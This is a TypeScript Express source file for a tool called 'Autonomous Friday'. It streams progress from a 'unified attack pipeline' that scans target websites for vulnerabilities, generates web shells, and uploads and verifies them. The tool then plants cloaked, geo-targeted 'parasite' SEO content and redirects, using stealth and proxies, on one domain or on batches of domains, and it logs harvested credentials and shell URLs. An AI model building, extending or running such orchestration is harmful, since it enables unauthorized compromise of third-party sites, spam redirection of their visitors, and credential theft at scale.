/**
 * SSE Streaming Endpoint for Autonomous Friday
 * POST /api/autonomous/stream       — single target deploy
 * POST /api/autonomous/batch/stream — batch multi-target deploy
 * One-click autonomous deploy — enter domain, system handles everything
 */
import type { Express, Request, Response } from "express";
import { sdk } from "./_core/sdk";
import {
  AttackLoop,
  FixatedLoop,
  EmergentLoop,
  type AutonomousConfig,
  type AutonomousEvent,
  type AutonomousCallback,
} from "./autonomous-engine";
import { AIAutonomousBrain } from "./ai-autonomous-brain";
import { runUnifiedAttackPipeline, type PipelineConfig, type PipelineResult, type PipelineEvent } from "./unified-attack-pipeline";
import { getDb } from "./db";
import { autonomousDeploys, autonomousBatches } from "../drizzle/schema";
import { eq } from "drizzle-orm";

// ─── Constants ───
const PIPELINE_TIMEOUT_MS = 5 * 60 * 1000; // 5 min max per target
const HEARTBEAT_INTERVAL_MS = 3_000;

// ─── Helpers ───

function parseSeoKeywords(input: unknown): string[] {
  if (!input) return [];
  if (Array.isArray(input)) return input.map(String).filter(Boolean);
  if (typeof input === "string") return input.split(",").map(s => s.trim()).filter(Boolean);
  return [];
}

// ─── DB Persistence for autonomous_deploys ───

async function createDeployRecord(userId: number, params: {
  targetDomain: string;
  redirectUrl: string;
  keywords: string[];
  mode: string;
  maxIterations: number;
  batchId?: number;
}): Promise<number | null> {
  try {
    const db = await getDb();
    if (!db) return null;
    const [result] = await db.insert(autonomousDeploys).values({
      userId,
      batchId: params.batchId || null,
      targetDomain: params.targetDomain,
      redirectUrl: params.redirectUrl,
      mode: params.mode as "attack" | "fixated" | "emergent",
      goal: "full_deploy",
      maxIterations: params.maxIterations,
      seoKeywords: params.keywords,
      geoRedirect: true,
      parasiteContentLength: "medium",
      parasiteRedirectDelay: 5,
      status: "running",
      startedAt: new Date(),
    } as any);
    return (result as any).insertId || null;
  } catch (e) {
    console.error("[Autonomous] Failed to create deploy record:", e);
    return null;
  }
}

async function updateDeployRecord(recordId: number, result: Record<string, unknown>, aiBrain: AIAutonomousBrain) {
  try {
    const db = await getDb();
    if (!db) return;

    const world = result.world as Record<string, number> | undefined;
    const ok = result.ok || result.goalMet || result.success;

    await db.update(autonomousDeploys).set({
      status: ok ? "success" : (world && (world.verifiedUrls > 0 || world.deployedFiles > 0)) ? "partial" : "failed",
      // World state
      hostsFound: world?.hosts || 0,
      portsFound: world?.ports || 0,
      vulnsFound: world?.vulns || 0,
      credsFound: world?.creds || 0,
      uploadPathsFound: world?.uploadPaths || 0,
      shellUrlsFound: world?.shellUrls || 0,
      filesDeployed: world?.deployedFiles || 0,
      filesVerified: world?.verifiedUrls || 0,
      // URLs
      shellUrls: result.shellUrls || [],
      deployedUrls: result.deployedFiles || result.deployedUrls || [],
      verifiedUrls: result.verifiedUrls || [],
      // Emergent metrics
      epochs: (result.epochs as number) || 0,
      waves: (result.totalWaves as number) || 0,
      escalationLevel: (result.finalEscName as string) || null,
      driftCount: (result.driftCount as number) || 0,
      hackCount: (result.hackCount as number) || 0,
      runawayScore: (result.runawayScore as number) || 0,
      boundaryLevel: (result.boundaryLevel as number) || 100,
      goalDrifted: (result.goalDrifted as boolean) || false,
      originalGoal: (result.originalGoal as string) || "full_deploy",
      finalGoal: (result.currentGoal as string) || "full_deploy",
      // AI Brain data
      aiStrategyUsed: aiBrain.getStrategies(),
      aiDecisions: aiBrain.getDecisions(),
      aiAdaptations: aiBrain.getDecisions().length,
      // Report
      fullReport: result,
      duration: (result.elapsedSec as number || 0) * 1000,
      completedAt: new Date(),
    } as any).where(eq(autonomousDeploys.id, recordId));
  } catch (e) {
    console.error("[Autonomous] Failed to update deploy record:", e);
  }
}

async function markDeployError(recordId: number, errorMessage: string, duration: number) {
  try {
    const db = await getDb();
    if (!db) return;
    await db.update(autonomousDeploys).set({
      status: "failed",
      errorMessage,
      duration,
      completedAt: new Date(),
    } as any).where(eq(autonomousDeploys.id, recordId));
  } catch (e) {
    console.error("[Autonomous] Failed to mark deploy error:", e);
  }
}

// ─── Batch DB helpers ───

async function createBatchRecord(userId: number, params: {
  name: string;
  targets: Array<{ domain: string; redirectUrl: string }>;
  mode: string;
  keywords: string[];
  maxIterationsPerTarget: number;
}): Promise<number | null> {
  try {
    const db = await getDb();
    if (!db) return null;
    const [result] = await db.insert(autonomousBatches).values({
      userId,
      name: params.name || `Batch ${new Date().toISOString().slice(0, 16)}`,
      targets: params.targets,
      mode: params.mode as "attack" | "fixated" | "emergent",
      seoKeywords: params.keywords,
      maxIterationsPerTarget: params.maxIterationsPerTarget,
      totalTargets: params.targets.length,
      status: "running",
      startedAt: new Date(),
    } as any);
    return (result as any).insertId || null;
  } catch (e) {
    console.error("[Autonomous] Failed to create batch record:", e);
    return null;
  }
}

async function updateBatchProgress(batchId: number, data: {
  completedTargets: number;
  successTargets: number;
  failedTargets: number;
  currentTarget?: string;
  currentDeployId?: number;
}) {
  try {
    const db = await getDb();
    if (!db) return;
    await db.update(autonomousBatches).set({
      completedTargets: data.completedTargets,
      successTargets: data.successTargets,
      failedTargets: data.failedTargets,
      currentTarget: data.currentTarget || null,
      currentDeployId: data.currentDeployId || null,
    } as any).where(eq(autonomousBatches.id, batchId));
  } catch (e) {
    console.error("[Autonomous] Failed to update batch progress:", e);
  }
}

async function completeBatch(batchId: number, data: {
  completedTargets: number;
  successTargets: number;
  failedTargets: number;
  duration: number;
  status: "completed" | "stopped" | "failed";
}) {
  try {
    const db = await getDb();
    if (!db) return;
    await db.update(autonomousBatches).set({
      completedTargets: data.completedTargets,
      successTargets: data.successTargets,
      failedTargets: data.failedTargets,
      status: data.status,
      duration: data.duration,
      currentTarget: null,
      currentDeployId: null,
      completedAt: new Date(),
    } as any).where(eq(autonomousBatches.id, batchId));
  } catch (e) {
    console.error("[Autonomous] Failed to complete batch:", e);
  }
}

// ─── SSE Helpers ───

function setupSSE(req: Request, res: Response) {
  res.writeHead(200, {
    "Content-Type": "text/event-stream",
    "Cache-Control": "no-cache",
    "Connection": "keep-alive",
    "X-Accel-Buffering": "no",
  });
  res.flushHeaders();

  let closed = false;
  let streamEnded = false;
  req.on("close", () => { closed = true; });

  function sendEvent(event: AutonomousEvent) {
    if (closed || streamEnded) return;
    try { res.write(`data: ${JSON.stringify(event)}\n\n`); } catch { /* disconnected */ }
  }

  function sendDone(data: any) {
    if (closed || streamEnded) return;
    streamEnded = true;
    try { res.write(`data: ${JSON.stringify({ type: "done", ...data })}\n\n`); } catch {}
    try { res.end(); } catch {}
  }

  function sendError(detail: string) {
    if (closed || streamEnded) return;
    streamEnded = true;
    try { res.write(`data: ${JSON.stringify({ type: "error", detail })}\n\n`); } catch {}
    try { res.end(); } catch {}
  }

  const heartbeat = setInterval(() => {
    if (closed || streamEnded) { clearInterval(heartbeat); return; }
    try { res.write(`:heartbeat\n\n`); } catch { clearInterval(heartbeat); }
  }, HEARTBEAT_INTERVAL_MS);

  const timeoutTimer = setTimeout(() => {
    clearInterval(heartbeat);
    if (!streamEnded && !closed) {
      sendError(`Autonomous pipeline timed out after ${PIPELINE_TIMEOUT_MS / 1000}s`);
    }
  }, PIPELINE_TIMEOUT_MS);

  function cleanup() {
    clearTimeout(timeoutTimer);
    clearInterval(heartbeat);
  }

  return { sendEvent, sendDone, sendError, cleanup, isClosed: () => closed || streamEnded };
}

// ─── Build config ───

function buildConfig(body: any, maxIter?: number): AutonomousConfig {
  const {
    targetDomain,
    redirectUrl,
    seoKeywords,
    mode = "emergent",
    maxIterations,
    geoRedirect = true,
    parasiteContentLength = "medium",
    parasiteRedirectDelay = 5,
    proxyList,
    weightedRedirects,
    methodPriority,
  } = body;

  let proxies: string[] = [];
  if (proxyList && typeof proxyList === "string" && proxyList.trim()) {
    proxies = proxyList.split("\n").map((l: string) => l.trim()).filter(Boolean);
  }

  let parsedMethodPriority: Array<{ id: string; enabled: boolean }> | undefined;
  if (methodPriority && Array.isArray(methodPriority)) {
    parsedMethodPriority = methodPriority;
  }

  const effectiveMaxIter = maxIter || maxIterations || 5;

  return {
    targetDomain,
    targetUrl: `https://${targetDomain}`,
    redirectUrl,
    goal: "full_deploy",
    maxWaves: 2,
    maxEpochs: Math.min(effectiveMaxIter, 10),
    maxCycles: 2,
    seoKeywords: parseSeoKeywords(seoKeywords),
    geoRedirect: geoRedirect ?? true,
    parasiteEnabled: true,
    parasiteContentLength: parasiteContentLength || "medium",
    parasiteRedirectDelay: parasiteRedirectDelay || 5,
    useAI: true,
    useStealth: true,
    useEnhancedUpload: true,
    proxies,
    weightedRedirects: typeof weightedRedirects === "string" ? weightedRedirects : "",
    methodPriority: parsedMethodPriority,
  };
}

// ─── Run single target ───

async function runSingleTarget(
  config: AutonomousConfig,
  mode: string,
  progressCallback: AutonomousCallback,
): Promise<Record<string, unknown>> {
  // ─── PHASE 1: Run Unified Attack Pipeline first (AI vuln scan → shell gen → multi-method upload → verify) ───
  const pipelineConfig: PipelineConfig = {
    targetUrl: config.targetUrl,
    redirectUrl: config.redirectUrl,
    seoKeywords: config.seoKeywords || [],
    geoRedirect: config.geoRedirect ?? true,
    parasiteContent: (config.parasiteContentLength as "short" | "medium" | "long") || "medium",
    cloaking: true,
    maxUploadAttempts: 5,
    timeoutPerMethod: 60000,
  };

  progressCallback({
    type: "phase_start",
    phase: "unified_pipeline",
    detail: "🚀 Phase 1: Unified Attack Pipeline — AI vuln scan → shell gen → multi-method upload → verify",
    data: { targetUrl: config.targetUrl },
  });

  let pipelineResult: PipelineResult | null = null;
  try {
    pipelineResult = await Promise.race([
      runUnifiedAttackPipeline(pipelineConfig, (event: PipelineEvent) => {
        // Bridge PipelineEvent → AutonomousEvent
        progressCallback({
          type: "step_detail",
          step: 0,
          phase: `pipeline_${event.phase}`,
          detail: event.detail,
          progress: event.progress,
          data: event.data,
        });
      }),
      new Promise<PipelineResult>((_, reject) => setTimeout(() => reject(new Error("Unified pipeline timeout")), 4 * 60 * 1000)),
    ]);
  } catch (e: any) {
    progressCallback({
      type: "step_detail",
      step: 0,
      phase: "pipeline_error",
      detail: `⚠️ Unified Pipeline error: ${e.message} — falling back to legacy engine`,
    });
  }

  // ─── Check if pipeline succeeded ───
  if (pipelineResult && pipelineResult.success && pipelineResult.verifiedFiles.length > 0) {
    progressCallback({
      type: "phase_complete",
      phase: "unified_pipeline",
      detail: `✅ Unified Pipeline สำเร็จ! ${pipelineResult.verifiedFiles.length} files verified, redirect working`,
      progress: 100,
      data: {
        uploadedFiles: pipelineResult.uploadedFiles.length,
        verifiedFiles: pipelineResult.verifiedFiles.length,
        aiDecisions: pipelineResult.aiDecisions,
      },
    });

    // Separate real uploads from shellless for accurate counting
    const realUploads = pipelineResult.uploadedFiles.filter(f => !f.method.startsWith("shellless_"));
    const shelllessRedirects = pipelineResult.uploadedFiles.filter(f => f.method.startsWith("shellless_") && f.redirectWorks);
    const realVerified = pipelineResult.verifiedFiles.filter(f => !f.method.startsWith("shellless_"));
    const shelllessVerified = pipelineResult.verifiedFiles.filter(f => f.method.startsWith("shellless_") && f.redirectWorks);
    const effectiveUploads = [...realUploads, ...shelllessRedirects];
    const effectiveVerified = [...realVerified, ...shelllessVerified];

    return {
      ok: true,
      goalMet: true,
      success: true,
      world: {
        hosts: 1,
        ports: 0,
        vulns: pipelineResult.vulnScan?.misconfigurations?.length || 0,
        creds: 0,
        uploadPaths: pipelineResult.vulnScan?.writablePaths?.length || 0,
        shellUrls: effectiveVerified.length,
        deployedFiles: effectiveUploads.length,
        verifiedUrls: effectiveVerified.length,
      },
      shellUrls: effectiveVerified.map(f => f.url),
      deployedFiles: effectiveUploads.map(f => f.url),
      verifiedUrls: effectiveVerified.map(f => f.url),
      pipelineResult,
      aiDecisions: pipelineResult.aiDecisions,
      elapsedSec: pipelineResult.totalDuration / 1000,
    };
  }

  // ─── If pipeline had partial results, record them ───
  if (pipelineResult && pipelineResult.uploadedFiles.length > 0) {
    progressCallback({
      type: "step_detail",
      step: 0,
      phase: "pipeline_partial",
      detail: `⚠️ Pipeline uploaded ${pipelineResult.uploadedFiles.length} files but verification incomplete — continuing with legacy engine for more attempts`,
    });
  }

  // ─── PHASE 2: Fall back to legacy Autonomous Engine for additional attempts ───
  progressCallback({
    type: "phase_start",
    phase: "legacy_engine",
    detail: `🔄 Phase 2: Legacy Autonomous Engine (${mode.toUpperCase()}) — additional upload methods and retries`,
  });

  switch (mode) {
    case "attack": {
      const loop = new AttackLoop(config, progressCallback);
      return await loop.runCycle();
    }
    case "fixated": {
      const loop = new FixatedLoop(config, progressCallback);
      return await loop.run();
    }
    case "emergent":
    default: {
      const loop = new EmergentLoop(config, progressCallback);
      return await loop.run();
    }
  }
}

// ═══════════════════════════════════════════════
// REGISTER ENDPOINTS
// ═══════════════════════════════════════════════

export function registerAutonomousSSE(app: Express) {

  // ─── Single target deploy ───
  app.post("/api/autonomous/stream", async (req: Request, res: Response) => {
    // Authenticate
    let user;
    try { user = await sdk.authenticateRequest(req); } catch {}
    if (!user) { res.status(401).json({ error: "Unauthorized" }); return; }

    const { targetDomain, redirectUrl, mode = "emergent", maxIterations = 5 } = req.body;
    if (!targetDomain || !redirectUrl) {
      res.status(400).json({ error: "targetDomain and redirectUrl are required" });
      return;
    }

    const sse = setupSSE(req, res);
    const parsedKeywords = parseSeoKeywords(req.body.seoKeywords);
    const pipelineStart = Date.now();

    // Create deploy record
    let deployRecordId: number | null = null;
    try {
      deployRecordId = await createDeployRecord(user.id, {
        targetDomain,
        redirectUrl,
        keywords: parsedKeywords,
        mode,
        maxIterations,
      });
    } catch { /* safe */ }

    if (deployRecordId) {
      sse.sendEvent({
        type: "step_detail",
        step: 0,
        phase: "init",
        detail: `📋 Autonomous Deploy #${deployRecordId} started — Mode: ${mode.toUpperCase()}`,
      });
    }

    // Create shared AI Brain
    const aiBrain = new AIAutonomousBrain(sse.sendEvent);

    // Build config
    const config = buildConfig(req.body, maxIterations);
    config.aiBrain = aiBrain;

    try {
      sse.sendEvent({
        type: "phase_start",
        phase: "autonomous_init",
        detail: `🤖 Initializing Autonomous Friday — ${mode.toUpperCase()} mode`,
        data: { mode, targetDomain, maxIterations: config.maxEpochs, keywords: parsedKeywords.length },
      });

      const result = await runSingleTarget(config, mode, sse.sendEvent);

      // Persist to DB
      const duration = Date.now() - pipelineStart;
      if (deployRecordId) {
        await updateDeployRecord(deployRecordId, { ...result, elapsedSec: duration / 1000 }, aiBrain);
      }

      // Send done
      sse.sendDone({
        success: result.ok || result.goalMet || result.success,
        mode,
        deployRecordId,
        duration,
        world: result.world,
        shellUrls: result.shellUrls,
        deployedFiles: result.deployedFiles,
        verifiedUrls: result.verifiedUrls,
        epochs: result.epochs,
        totalWaves: result.totalWaves,
        escalationLevel: result.finalEscName,
        goalDrifted: result.goalDrifted,
        aiPostDeploy: result.aiPostDeploy,
        aiSummary: aiBrain.getSummary(),
      });
    } catch (e: any) {
      console.error("[Autonomous] Pipeline error:", e);
      const duration = Date.now() - pipelineStart;
      if (deployRecordId) {
        await markDeployError(deployRecordId, e.message, duration);
      }
      sse.sendError(`Autonomous pipeline failed: ${e.message}`);
    } finally {
      sse.cleanup();
    }
  });

  // ─── Batch multi-target deploy ───
  app.post("/api/autonomous/batch/stream", async (req: Request, res: Response) => {
    // Authenticate
    let user;
    try { user = await sdk.authenticateRequest(req); } catch {}
    if (!user) { res.status(401).json({ error: "Unauthorized" }); return; }

    const {
      targets,       // Array<{ domain: string; redirectUrl: string }>
      mode = "emergent",
      seoKeywords,
      maxIterationsPerTarget = 5,
      batchName,
    } = req.body;

    if (!targets || !Array.isArray(targets) || targets.length === 0) {
      res.status(400).json({ error: "targets array is required" });
      return;
    }

    const sse = setupSSE(req, res);
    const parsedKeywords = parseSeoKeywords(seoKeywords);
    const batchStart = Date.now();

    // Create batch record
    let batchId: number | null = null;
    try {
      batchId = await createBatchRecord(user.id, {
        name: batchName || `Batch ${targets.length} targets`,
        targets,
        mode,
        keywords: parsedKeywords,
        maxIterationsPerTarget,
      });
    } catch { /* safe */ }

    sse.sendEvent({
      type: "phase_start",
      phase: "batch_init",
      detail: `📦 Batch Deploy started — ${targets.length} targets, Mode: ${mode.toUpperCase()}${batchId ? ` (Batch #${batchId})` : ""}`,
      data: { batchId, totalTargets: targets.length, mode },
    });

    let completedTargets = 0;
    let successTargets = 0;
    let failedTargets = 0;
    const batchResults: Array<Record<string, unknown>> = [];

    for (let i = 0; i < targets.length; i++) {
      if (sse.isClosed()) break;

      const target = targets[i];
      const domain = target.domain || target.targetDomain;
      const redirectUrl = target.redirectUrl;

      if (!domain || !redirectUrl) {
        failedTargets++;
        completedTargets++;
        batchResults.push({ domain: domain || "unknown", success: false, error: "Missing domain or redirectUrl" });
        continue;
      }

      sse.sendEvent({
        type: "phase_start",
        phase: `target_${i + 1}`,
        detail: `🎯 Target ${i + 1}/${targets.length}: ${domain}`,
        data: { targetIndex: i, domain, redirectUrl, batchId },
      });

      // Create deploy record for this target
      let deployRecordId: number | null = null;
      try {
        deployRecordId = await createDeployRecord(user.id, {
          targetDomain: domain,
          redirectUrl,
          keywords: parsedKeywords,
          mode,
          maxIterations: maxIterationsPerTarget,
          batchId: batchId || undefined,
        });
      } catch { /* safe */ }

      // Update batch progress
      if (batchId) {
        await updateBatchProgress(batchId, {
          completedTargets,
          successTargets,
          failedTargets,
          currentTarget: domain,
          currentDeployId: deployRecordId || undefined,
        });
      }

      // Create AI Brain per target (fresh brain for each)
      const aiBrain = new AIAutonomousBrain(sse.sendEvent);

      // Build config for this target
      const config = buildConfig({
        ...req.body,
        targetDomain: domain,
        redirectUrl,
        maxIterations: maxIterationsPerTarget,
      }, maxIterationsPerTarget);
      config.aiBrain = aiBrain;

      try {
        const targetStart = Date.now();
        const result = await runSingleTarget(config, mode, sse.sendEvent);
        const targetDuration = Date.now() - targetStart;

        const isSuccess = result.ok || result.goalMet || result.success;
        if (isSuccess) successTargets++;
        else failedTargets++;
        completedTargets++;

        // Persist
        if (deployRecordId) {
          await updateDeployRecord(deployRecordId, { ...result, elapsedSec: targetDuration / 1000 }, aiBrain);
        }

        batchResults.push({
          domain,
          success: isSuccess,
          deployRecordId,
          duration: targetDuration,
          world: result.world,
          shellUrls: result.shellUrls,
          verifiedUrls: result.verifiedUrls,
        });

        sse.sendEvent({
          type: "phase_complete",
          phase: `target_${i + 1}`,
          detail: `${isSuccess ? "✅" : "❌"} Target ${i + 1}/${targets.length}: ${domain} — ${isSuccess ? "SUCCESS" : "FAILED"} (${Math.round(targetDuration / 1000)}s)`,
          progress: Math.round(((i + 1) / targets.length) * 100),
          data: { domain, success: isSuccess, duration: targetDuration },
        });
      } catch (e: any) {
        failedTargets++;
        completedTargets++;
        const targetDuration = Date.now() - (Date.now() - 1000);

        if (deployRecordId) {
          await markDeployError(deployRecordId, e.message, targetDuration);
        }

        batchResults.push({ domain, success: false, error: e.message });

        sse.sendEvent({
          type: "step_detail",
          phase: `target_${i + 1}`,
          detail: `❌ Target ${i + 1} error: ${e.message}`,
        });
      }
    }

    // Complete batch
    const batchDuration = Date.now() - batchStart;
    if (batchId) {
      await completeBatch(batchId, {
        completedTargets,
        successTargets,
        failedTargets,
        duration: batchDuration,
        status: failedTargets === targets.length ? "failed" : "completed",
      });
    }

    sse.sendDone({
      batchId,
      totalTargets: targets.length,
      completedTargets,
      successTargets,
      failedTargets,
      duration: batchDuration,
      results: batchResults,
    });

    sse.cleanup();
  });
}
